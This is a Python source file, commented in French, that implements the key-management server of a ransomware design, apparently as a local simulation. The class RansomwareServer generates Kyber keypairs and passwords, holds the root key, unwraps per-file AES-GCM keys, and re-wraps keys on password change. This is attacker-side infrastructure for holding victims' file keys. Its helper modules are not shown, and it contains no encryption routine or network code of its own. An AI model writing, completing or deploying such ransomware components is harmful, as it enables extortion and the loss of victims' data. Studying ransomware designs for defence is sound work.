"""
Gère la génération des clés, le stockage et la communication avec le client
"""

from typing import Dict, Optional

import config
import crypto_utils
import wordlist


class RansomwareServer:
    """
    Serveur pour gestion des clés
    """

    def __init__(self):
        """Initialise serveur"""
        self.root_key: Optional[bytes] = None
        self.wrapped_rk: Optional[bytes] = None
        self.password: Optional[str] = None
        self.salt: Optional[bytes] = None
        self.argon2_params: Optional[Dict] = None
        self.kyber_public_key: Optional[bytes] = None
        self.kyber_secret_key: Optional[bytes] = None
        self.initialized = False

    def initialize_server(self) -> Dict:
        """
        Initialise serveur et génère clés

        Returns:
            Dictionnaire avec password, salt, argon2_params et kyber_public_key
        """
        print("[SVR] Initialisation du serveur")

        # Génère paire clés Kyber
        self.kyber_public_key, self.kyber_secret_key = crypto_utils.generate_kyber_keypair()

        # Génère mdp aléatoire
        self.password = wordlist.generate_random_password()
        print(f"[SVR] Mot de passe généré : {self.password}")

        # Génère sel
        self.salt = crypto_utils.generate_random_salt()

        # Paramètres Argon2
        self.argon2_params = {
            "time_cost": config.ARGON2_TIME_COST,
            "memory_cost": config.ARGON2_MEMORY_COST,
            "parallelism": config.ARGON2_PARALLELISM,
            "hash_len": config.ARGON2_HASH_LEN,
        }

        self.initialized = True

        # Retourne infos au client
        return {
            "password": self.password,
            "salt": self.salt,
            "argon2_params": self.argon2_params,
            "kyber_public_key": self.kyber_public_key,
        }

    def request_full_decryption_credentials(self) -> Dict:
        """
        Retourne credentials pour déchiffrement complet

        Returns:
            Dictionnaire avec password, salt, argon2_params
        """
        if not self.initialized:
            raise RuntimeError("[ERR] Le serveur n'est pas initialisé")

        print("[SVR] Envoi credentials de déchiffrement au client")

        return {
            "password": self.password,
            "salt": self.salt,
            "argon2_params": self.argon2_params,
        }

    def request_file_key_unwrap(self, wrapped_key_ciphertext: bytes, wrapped_key_nonce: bytes, wrapped_key_tag: bytes, kyber_ciphertext: bytes) -> bytes:
        """
        Désencapsule clé de fichier avec RK

        Args:
            wrapped_key_ciphertext: Ciphertext clé de fichier encapsulée
            wrapped_key_nonce: Nonce utilisé pour l'encapsulation
            wrapped_key_tag: Tag
            kyber_ciphertext: Ciphertext Kyber pour récupérer RK

        Returns:
            Clé de fichier désencapsulée
        """
        if not self.initialized:
            raise RuntimeError("[ERR] Le serveur n'est pas initialisé")

        if self.kyber_secret_key is None:
            raise RuntimeError("[ERR] La clé secrète Kyber n'est pas dispo")

        root_key = crypto_utils.kyber_decapsulate(self.kyber_secret_key, kyber_ciphertext)

        print("[SVR] Désencapsule clé de fichier")
        file_key = crypto_utils.unwrap_key_aes_gcm(wrapped_key_ciphertext, root_key, wrapped_key_nonce, wrapped_key_tag)

        return file_key

    def change_password(self, new_password: str, new_salt: bytes, new_argon2_params: Dict, kyber_ciphertext: bytes) -> Dict:
        """
        Change mdp et re-encapsule RK

        Args:
            new_password: New mdp
            new_salt: New sel
            new_argon2_params: New paramètres
            kyber_ciphertext: Ciphertext Kyber pour récupérer RK

        Returns:
            Dictionnaire avec wrapped_rk, salt et argon2_params
        """
        if not self.initialized:
            raise RuntimeError("[ERR] Le serveur n'est pas initialisé")

        if self.kyber_secret_key is None:
            raise RuntimeError("[ERR] La clé secrète Kyber n'est pas dispo")

        print("[SVR] Changement du mot de passe")

        # Récupère RK
        root_key = crypto_utils.kyber_decapsulate(self.kyber_secret_key, kyber_ciphertext)

        # Dérive new MK
        print("[SVR] Dérivation de la nouvelle MK")
        new_master_key = crypto_utils.derive_key_argon2(
            password=new_password,
            salt=new_salt,
            **new_argon2_params
        )

        # Re-encapsule RK avec new MK
        print("[SVR] Re-encapsule RK")
        wrapped_rk_ciphertext, wrapped_rk_nonce, wrapped_rk_tag = crypto_utils.wrap_key_aes_gcm(root_key, new_master_key)

        # Màj état serveur
        self.password = new_password
        self.salt = new_salt
        self.argon2_params = new_argon2_params

        print("[SVR] Mot de passe changé")

        return {
            "wrapped_rk_ciphertext": wrapped_rk_ciphertext,
            "wrapped_rk_nonce": wrapped_rk_nonce,
            "wrapped_rk_tag": wrapped_rk_tag,
            "salt": new_salt,
            "argon2_params": new_argon2_params,
        }


# Instance globale du serveur (simulation locale)
server = RansomwareServer()
